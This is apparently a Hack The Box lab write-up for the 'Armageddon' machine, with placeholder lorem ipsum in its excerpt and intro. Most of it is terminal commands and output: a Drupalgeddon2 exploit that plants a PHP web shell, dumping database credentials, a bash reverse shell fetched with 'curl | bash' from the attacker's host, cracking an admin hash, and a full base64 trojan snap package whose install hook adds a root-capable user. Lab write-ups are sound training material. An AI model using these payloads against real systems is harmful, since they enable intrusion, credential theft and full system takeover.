---
layout: single
title: Armageddon - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-03-30
classes: wide
header:
  teaser: /assets/images/htb-writeup-armageddon/armageddon_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-armageddon/armageddon_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb]# nmap -Pn -n -sCV 10.129.103.143                                                                (master✱)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-29 14:51 CEST
Nmap scan report for 10.129.103.143
Host is up (0.028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon


2. As we see 'Drupal 7' from the nmap output, and the box name is 'armageddon' - this higly suggests that the
exploit used here should be drupalgeddon. First things first, we need to find the drupal version.

[root:/opt/shells/py]# droopescan
  --- snip ---
  [+] Possible version(s):
      7.56

Download drupalgeddon2 from their github and execute to get a php shell.

[root:/git/htb/armageddon]# ./drupalgeddon.rb 10.129.103.143                                                                                        (master✱)
  [*] --==[::#Drupalggedon2::]==--
  --------------------------------------------------------------------------------
  [i] Target : http://10.129.103.143/
  --------------------------------------------------------------------------------
  [+] Found  : http://10.129.103.143/CHANGELOG.txt    (HTTP Response: 200)
  [+] Drupal!: v7.56
  --------------------------------------------------------------------------------
  [*] Testing: Form   (user/password)
  [+] Result : Form valid
  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  [*] Testing: Clean URLs
  [!] Result : Clean URLs disabled (HTTP Response: 404)
  [i] Isn't an issue for Drupal v7.x
  --------------------------------------------------------------------------------
  [*] Testing: Code Execution   (Method: name)
  [i] Payload: echo KCZFEGTX
  [+] Result : KCZFEGTX
  [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
  --------------------------------------------------------------------------------
  [*] Testing: Existing file   (http://10.129.103.143/shell.php)
  [!] Response: HTTP 200 // Size: 6.   ***Something could already be there?***
  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  [*] Testing: Writing To Web Root   (./)
  [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
  [+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
  [+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
  --------------------------------------------------------------------------------
  [i] Fake PHP shell:   curl 'http://10.129.103.143/shell.php' -d 'c=hostname'
  armageddon.htb>> whoami
  apache

Look on the drupal default configuration to see if we can find any sensitive data.
armageddon.htb>> cat sites/default/settings.php
  --- snip ---
  $databases = array (
    'default' =>
    array (
      'default' =>
      array (
        'database' => 'drupal',
        'username' => 'drupaluser',
        'password' => 'CQHEy@9M*m23gBVj',
        'host' => 'localhost',
        'port' => '',
        'driver' => 'mysql',
        'prefix' => '',
      ),
    ),
  );

Because we only have a semi-interactive shell we can't use mysqldump;
armageddon.htb>> mysqldump drupal -u drupaluser -p
  Enter password: mysqldump: Got error: 1045: "Access denied for user 'drupaluser'@'localhost' (using password: NO)" when trying to connect

Trying to curl on high ports ex 4488, 4444 or 8080 results in nothing. However trying normal ports like 80 or 443 works.
With this in mind, we create a bash reverse payload and setup a python http.server to trigger the reverse shell.

[root:/srv/pub-share]# echo "bash -i >& /dev/tcp/10.10.14.82/443 0>&1" > rev.sh
[root:/srv/pub-share]# chmod +x rev.sh
[root:/srv/pub-share]# python3 -m http.server 80

armageddon.htb>> curl http://10.10.14.82/rev.sh | bash

[root:/opt/shells/py]# nc -lvnp 443
  listening on [any] 443 ...
  connect to [10.10.14.82] from (UNKNOWN) [10.129.104.71] 59264
  bash: no job control in this shell
  bash-4.2$ whoami
    apache


3. We now have a interactive shell and can access the mysql database, normally or dumping it.

mysqldump output A LOT of data, so going for the normal way might be the play.
bash-4.2$ mysqldump drupal -u drupaluser -p
  --- snip ---
  -- Dumping data for table `users`
  --

  LOCK TABLES `users` WRITE;
  /*!40000 ALTER TABLE `users` DISABLE KEYS */;
  INSERT INTO `users` VALUES (0,'','','','','',NULL,0,0,0,0,NULL,'',0,'',NULL),(1,'brucetherealadmin','$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt','admin@armageddon.eu','','','filtered_html',1606998756,1607077194,1607076276,1,'Europe/London','',0,'admin@armageddon.eu','a:1:{s:7:\"overlay\";i:1;}');
  /*!40000 ALTER TABLE `users` ENABLE KEYS */;
  UNLOCK TABLES;

[root:/git/htb/armageddon]# echo "$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt" > brucetherealadmin.hash
[root:/git/htb/armageddon]# hashcat -a0 -m7900 brucetherealadmin.hash /usr/share/wordlists/rockyou.txt
  --- snip ---
  $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo

  Session..........: hashcat
  Status...........: Cracked
  Hash.Name........: Drupal7


[root:/git/htb/armageddon]# ssh brucetherealadmin@10.129.104.71                                                                                     (master✱)
  brucetherealadmin@10.129.104.71's password: booboo
  Last login: Tue Mar 23 12:40:36 2021 from 10.10.14.2
  [brucetherealadmin@armageddon ~]$ cat user.txt
    8f83a9bfe112d6b52680038b2db5eb51


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Upload linpeas.sh and run.

[root:...esome-scripts-suite/linPEAS]# python3 -m http.server 80
[brucetherealadmin@armageddon shm]$ curl http://10.10.14.82/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  218k  100  218k    0     0  1202k      0 --:--:-- --:--:-- --:--:-- 1207k
[brucetherealadmin@armageddon shm]$ chmod +x linpeas.sh
[brucetherealadmin@armageddon shm]$ ./linpeas.sh
  --- snip ---
  [+] PATH
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath
  /usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin
  --- snip ---
  User brucetherealadmin may run the following commands on armageddon:
      (root) NOPASSWD: /usr/bin/snap install *

From Linpeas we find that we find some interesting paths, as well as we are allowed to install any snap packages.
We can probably use this to elevate our privileges by creating a custom snap package.


2. Googling around about 'snap privesc' one ofthe first things that comes up are dirty_sock. Reading about it, it's only
vulnerable against systems below version 2.37.1.

[brucetherealadmin@armageddon ~]$ snap version
  snapd   2.47.1-1.el7

And as we see from version output, the victim runs version 2.47.1 and should not be vulnerable. Downloading and running
the script (dirty_sockv2.py) proves that. However since we have option to install, lets look through what the script does.
At the very top of the script we find something very interesting:

  # The following global is a base64 encoded string representing an installable
  # snap package. The snap itself is empty and has no functionality. It does,
  # however, have a bash-script in the install hook that will create a new user.
  # For full details, read the blog linked on the github page above.
  TROJAN_SNAP = ('''
  aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
  /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
  ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
  TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
  T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
  Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
  ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
  ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
  L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
  b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
  rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
  rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
  AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
  XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
  RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
  AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
                 + 'A' * 4256 + '==')

Lets create our own 'TROJAN_SNAP' by using this code.

[brucetherealadmin@armageddon ~]$ python2 -c "print 'aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw' + 'A'*4256 + '=='" | base64 -d > TROJAN_SNAP.snap

[brucetherealadmin@armageddon ~]$ cat TROJAN_SNAP.snap
  hsqs!V\�������������>x#!/bin/bash

  useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
  usermod -aG sudo dirty_sock
  echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
  name: dirty-sock
  version: '0.1'
  summary: Empty snap, used for exploit
  description: 'See https://github.com/initstring/dirty_sock

    '
  architectures:
  - amd64
  confinement: devmode
  grade: devel
  �YZ��7zXZi"�6�S�!�����K]j;n��Q�b3ʶ]I-�,����Hʭ�E��k�qj|��$l5K�(�y����#�Jq_ͼӡ�h�D��u������e�?U�V���þ�Xx�h#�?>0
  �YZ8��<\���>��[

brucetherealadmin@armageddon ~]$ sudo snap install TROJAN_SNAP.snap
  error: cannot find signatures with metadata for snap "TROJAN_SNAP.snap"

We encounter an error when installing because the confinement-flag 'devmode' is missing.

[brucetherealadmin@armageddon ~]$ sudo snap install --devmode TROJAN_SNAP.snap
  dirty-sock 0.1 installed


3. Login with your new user, dirty_sock, and escalate to root by using 'sudo -i' and grab root.txt

[brucetherealadmin@armageddon ~]$ su dirty_sock
  Pa ssword:
[dirty_sock@armageddon brucetherealadmin]$ whoami
  dirty_sock
[dirty_sock@armageddon brucetherealadmin]$ cat /root/root.txt
  cat: /root/root.txt: Permission denied
[dirty_sock@armageddon brucetherealadmin]$ sudo -i

  We trust you have received the usual lecture from the local System
  Administrator. It usually boils down to these three things:

      #1) Respect the privacy of others.
      #2) Think before you type.
      #3) With great power comes great responsibility.

  [sudo] password for dirty_sock:
[root@armageddon ~]# cat /root/root.txt
  2553971efae28d5233668a09ef81951b


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


 drupalgeddon2:
   https://github.com/dreadlocked/Drupalgeddon2

Dirty_sock:
  https://github.com/initstring/dirty_sock
  https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py

Snap Installation Guide:
  https://snapcraft.io/docs/installing-snap-on-debian
  https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy
